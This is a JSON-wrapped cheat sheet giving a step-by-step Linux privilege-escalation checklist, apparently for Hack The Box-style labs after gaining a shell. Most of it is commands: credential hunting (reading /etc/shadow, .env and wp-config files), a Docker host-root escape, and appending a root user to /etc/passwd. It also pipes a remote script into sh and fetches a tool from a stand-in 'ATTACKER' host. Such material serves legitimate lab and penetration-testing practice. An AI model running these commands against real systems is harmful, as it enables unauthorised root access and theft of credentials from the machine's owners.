{"title": "linux-privesc-checklist", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-linux-linux-privesc-checklist", "html": "<h1 id=\"linux-linux-privesc-checklist\">linux-privesc-checklist</h1>\n<p>Run through this systematically after landing a shell. Order is roughly by frequency of success in HTB.</p>\n<h3>Sudo</h3>\n<pre><code class=\"language-bash\">sudo -l                          # Check what you can run as root\nsudo -V                          # Version — check for CVEs (Baron Samedit: &lt; 1.9.5p2)</code></pre>\n<p>If <code>(ALL) NOPASSWD:</code> appears, check GTFOBins immediately.</p>\n<h3>SUID / SGID Binaries</h3>\n<pre><code class=\"language-bash\">find / -perm -4000 -type f 2&gt;/dev/null   # SUID\nfind / -perm -2000 -type f 2&gt;/dev/null   # SGID\nfind / -perm -u=s -type f 2&gt;/dev/null    # Alternative SUID</code></pre>\n<p>Cross-reference custom or unusual binaries with GTFOBins. Look for anything outside <code>/usr/bin</code>, <code>/usr/sbin</code>.</p>\n<h3>Capabilities</h3>\n<pre><code class=\"language-bash\">getcap -r / 2&gt;/dev/null</code></pre>\n<p>Dangerous caps: <code>cap_setuid</code>, <code>cap_net_raw</code>, <code>cap_dac_override</code>, <code>cap_sys_admin</code>.</p>\n<h3>Cron Jobs</h3>\n<pre><code class=\"language-bash\">cat /etc/crontab\nls -la /etc/cron.*\nls -la /var/spool/cron/crontabs/\nsystemctl list-timers --all</code></pre>\n<p>Look for: writable scripts, wildcard injection, relative path references.</p>\n<h3>Writable PATH Hijacking</h3>\n<pre><code class=\"language-bash\">echo $PATH\nfind / -writable -type d 2&gt;/dev/null | grep -E &quot;^(/usr/local/bin|/usr/bin|/tmp)&quot;</code></pre>\n<p>If a cron or SUID binary calls a command without full path, drop a malicious binary in a writable PATH dir.</p>\n<h3>Kernel Exploits</h3>\n<pre><code class=\"language-bash\">uname -a\ncat /etc/os-release</code></pre>\n<p>Feed version to <code>linux-exploit-suggester</code> or search manually. Common: DirtyPipe (5.8-5.16.11), DirtyCow (&lt; 4.8.3), PwnKit (pkexec).</p>\n<h3>Internal Services</h3>\n<pre><code class=\"language-bash\">ss -tlnp\nss -ulnp\nnetstat -antup 2&gt;/dev/null</code></pre>\n<p>Services on 127.0.0.1 only — may be exploitable and not firewalled from localhost.</p>\n<h3>Credential Hunting</h3>\n<pre><code class=\"language-bash\">cat ~/.bash_history\ncat /etc/shadow                          # If readable\nfind / -name &quot;*.conf&quot; -exec grep -li &quot;pass&quot; {} \\; 2&gt;/dev/null\nfind / -name &quot;*.php&quot; -exec grep -li &quot;password&quot; {} \\; 2&gt;/dev/null\nfind / -name &quot;.env&quot; 2&gt;/dev/null\nenv | grep -i pass\ncat /var/www/html/wp-config.php 2&gt;/dev/null\ncat /opt/*/config* 2&gt;/dev/null</code></pre>\n<h3>Docker / LXD Group</h3>\n<pre><code class=\"language-bash\">id                               # Check groups\ngroups</code></pre>\n<p>Docker: <code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> LXD: Import alpine image, mount host root, access via shell.</p>\n<h3>NFS no_root_squash</h3>\n<pre><code class=\"language-bash\">cat /etc/exports\nshowmount -e TARGET</code></pre>\n<p>If <code>no_root_squash</code> is set, mount from attacker, create SUID binary as root.</p>\n<h3>Writable /etc/passwd</h3>\n<pre><code class=\"language-bash\">ls -la /etc/passwd</code></pre>\n<p>If writable, add a root-level user:</p>\n<pre><code class=\"language-bash\">openssl passwd -1 password123\necho &#x27;hacker:HASH:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</code></pre>\n<h3>Automated Tools</h3>\n<pre><code class=\"language-bash\"># LinPEAS (best overall)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# LinEnum\n./LinEnum.sh -t</code></pre>\n<p>Host locally: <code>python3 -m http.server 80</code> then <code>wget http://ATTACKER/linpeas.sh</code> on target.</p>", "excerpt": "linux-privesc-checklist Run through this systematically after landing a shell. Order is roughly by frequency of success in HTB. Sudo sudo -l # Check what you can run as root sudo -V # Version — check …", "tags": ["reference", "linux"]}